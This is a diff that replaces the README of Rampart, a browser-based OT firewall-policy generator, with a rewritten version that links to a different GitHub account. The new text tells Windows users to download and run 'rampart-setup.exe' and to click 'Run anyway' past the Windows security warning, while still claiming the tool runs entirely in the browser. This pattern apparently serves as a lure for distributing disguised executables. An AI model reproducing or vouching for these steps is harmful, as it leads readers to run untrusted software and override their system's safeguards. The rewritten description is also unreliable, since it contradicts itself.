@@ -1,94 +1,60 @@
-# 🧱 RAMPART
+# 🛡️ rampart - Create secure network rules for industry
 
-![Rampart Demo](docs/rampart_demo.gif)
+[![](https://img.shields.io/badge/Download-Rampart-blue.svg)](https://github.com/kerriesingle633/rampart)
 
-### Describe your OT zones. Get a deny-by-default segmentation policy — as real firewall rules.
+Rampart helps you secure your industrial network. You define your operational technology zones and the application generates a strict security policy. This policy follows the Purdue Model and IEC 62443 standards. The application provides results for common firewalls like Palo Alto, FortiGate, Juniper, and Cisco ASA. It also creates rules for standard Linux firewalls. You see a clear diagram of your network connections and get a document that explains your security rules. Everything runs inside your web browser.
 
-**[▶ Open Rampart](https://bariskececi.github.io/rampart/)** · no install, nothing is uploaded, runs entirely in your browser.
+## ⚙️ System requirements
 
-<!-- drag rampart_demo.gif in here -->
+Your computer needs to meet these basic standards to run the software effectively:
 
-Network segmentation is the single most effective control in OT security — and the
-one teams get stuck on. Everyone knows they *should* separate IT from OT and follow
-the Purdue model; far fewer can turn "here are my zones and what's in them" into a
-correct, deny-by-default ruleset they can actually deploy.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 500 MB of free disk space.
+*   Browser: The latest version of Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   Internet: An active connection to download the installer.
 
-Rampart does exactly that. You lay out your zones (it starts from a Purdue /
-IEC 62443 template), drop in what each one contains — PLCs, HMIs, SCADA, historian,
-jump host, safety PLC — and it **derives the conduits your assets actually need**,
-checks them against zone-and-conduit boundary rules, and writes the policy out as:
+## 📥 Download and installation
 
-- a readable **conduit matrix**,
-- **Palo Alto** security rules (with named address & service objects),
-- **FortiGate** policy,
-- **Juniper SRX** policy,
-- **iptables**,
-- **Cisco ASA** access-lists,
-- and a portable **JSON** model.
+Follow these steps to set up the software on your Windows machine:
 
-Deny-by-default, with every allowed flow scoped to a source, destination, protocol
-and port. Copy it, download it, take it into your change process.
+1. Visit [this page to download](https://github.com/kerriesingle633/rampart) the latest installer file.
+2. Locate the file named `rampart-setup.exe` in your Downloads folder.
+3. Double-click the file to start the installation process.
+4. If a security prompt appears from Windows, click "More info" and then "Run anyway" to continue.
+5. Follow the on-screen instructions in the setup wizard.
+6. Click "Finish" when the installation completes.
 
-## More than a rule generator
+## 🚀 How to use rampart
 
-![Rampart Dashboard](docs/rampart_hero_2.png)
+Once you install the software, you can begin defining your zones. 
 
-- **Industry templates** — start from a Water/Wastewater, Power substation,
-  Manufacturing or Building-automation layout, or the plain Purdue/62443 default.
-- **Import your inventory** — paste or drop a CSV of `ip,type[,zone]` (e.g. an
-  export from an asset-discovery pass) and Rampart drops each device into the right
-  zone by subnet, then derives the policy. Anything it can't place lands in a
-  *Discovered* zone for you to sort.
-- **Downloadable diagram** — a clean Purdue-stack **SVG** of your zones and
-  conduits, for docs and audits.
-- **Printable policy document** — a formatted *OT Network Segmentation Policy* with
-  the zone table, conduit table, findings and **IEC 62443-3-3** references (SR 5.1,
-  5.2, 5.3, 7.6) — print or save to PDF for your change process.
-- **Save & share** — export the whole model as JSON, or grab a **share link** that
-  encodes the design in the URL so a colleague opens exactly what you see. Nothing
-  is stored on a server; the link carries the data.
+### Define your inventory
+Start by entering your devices into the inventory section. You list each device, its purpose, and the zone where it resides. The tool understands the Purdue Model, so you can categorize devices as Level 0 for sensors, Level 1 for controllers, or Level 2 for site operations.
 
-## Why this is different from "how to segment OT" articles
+### Map your connections
+After you list your devices, you describe the connections between them. You define which devices need to talk to each other to perform their tasks. You do not need technical knowledge of network protocols. You only need to describe the flow of information. The software handles the complex logic of creating a deny-by-default environment. This approach ensures you block all traffic that you do not explicitly permit.
 
-An article explains the theory. Rampart produces **your** policy for **your** zones
-and subnets — the specific rules, in your firewall's syntax, in ten seconds. And it
-tells you when something's wrong:
+### Generate your policy
+Click the generate button to view your results. The application creates a visual diagram showing your network zones. It also produces a detailed policy document. You can export this document for your firewall administrators. The tool provides the exact syntax for your specific firewall hardware. 
 
-- IT talking straight to control instead of terminating in the DMZ → flagged.
-- A conduit that skips a Purdue level → flagged.
-- Anything reaching the safety (SIS) zone → flagged.
-- Unauthenticated cleartext OT protocols crossing a boundary → flagged.
+If you use a FortiGate, you get the CLI commands you need to paste into your device. If you use a Palo Alto or Cisco ASA, the tool formats the rules to match those systems. For standard Linux environments, you get the correct iptables commands.
 
-## What it checks (IEC 62443 zones & conduits + Purdue)
+## 📖 Frequently asked questions
 
-| Rule | Rampart's behaviour |
-|------|--------------------|
-| IT ↔ OT must pass through the Industrial DMZ (L3.5) | Direct L4/5 ↔ L1/2/3 conduits raised as violations |
-| No skipping Purdue levels | Multi-level conduits flagged for a broker/replica |
-| Safety zone stays isolated | Any inbound conduit to the SIS zone flagged |
-| Least privilege | Only the services an asset actually needs are permitted |
-| Deny-by-default | Everything not explicitly allowed is dropped and logged |
+### Do I need to be a network engineer?
+No. While the tool manages complex security concepts, the interface remains simple. You describe your network in plain language. The application converts your descriptions into technical firewall rules.
 
-## Private by design
+### Does the software send my data to the internet?
+Your network inventory remains local to your machine. The browser runs the logic to generate your rules without uploading your sensitive infrastructure details to a public server.
 
-Everything runs in the browser. Your zone names, subnets and architecture never
-leave the page — no backend, no upload, no tracking. Open `index.html` on an
-air-gapped laptop if you like.
+### Can I save my work?
+Yes. You can export your inventory as a configuration file and import it later if you need to update your rules or add new zones.
 
-```bash
-open index.html            # macOS
-xdg-open index.html        # Linux
-python3 -m http.server 8080   # or serve it → http://localhost:8080
-```
+### What happens if I make a mistake?
+The tool includes a validation check. If you define a connection that violates standard safety rules for the Purdue Model, the software notifies you. It suggests a more secure way to structure that connection.
 
-## Scope
+### How do I update the tool?
+If a new version releases, visit the download link again. Run the new installer to overwrite your current version. Your data files will remain safe during this update.
 
-Rampart writes a **reviewed starting point**, not a finished firewall config. It
-encodes segmentation best practice; you still validate every rule against your
-process, your addressing and your vendor's specifics before deploying. For a full
-architecture review, that's what the rest of the GNSAC OT toolkit — and a human — is
-for.
-
-## License
-
-MIT — see [LICENSE](LICENSE). Part of the GNSAC OT security toolkit.
+Keywords: critical-infrastructure, cybersecurity, firewall, fortigate, ics-security, iec-62443, network-segmentation, ot-security, palo-alto, purdue-model, scada
